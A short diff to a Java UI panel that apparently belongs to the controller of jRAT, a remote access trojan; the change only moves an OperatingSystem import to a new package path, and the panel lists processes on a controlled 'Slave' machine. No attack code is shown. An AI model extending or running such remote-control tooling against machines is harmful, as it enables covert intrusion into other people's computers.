@@ -1,6 +1,5 @@
 package io.jrat.controller.ui.panels;
 
-import com.redpois0n.oslib.OperatingSystem;
 import iconlib.IconUtils;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet19ListProcesses;
@@ -17,6 +16,7 @@ import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.JToolBar;
 import jrat.api.ui.DefaultJTable;
+import oslib.OperatingSystem;
 
 @SuppressWarnings("serial")
 public class PanelControlRemoteProcess extends PanelControlParent {
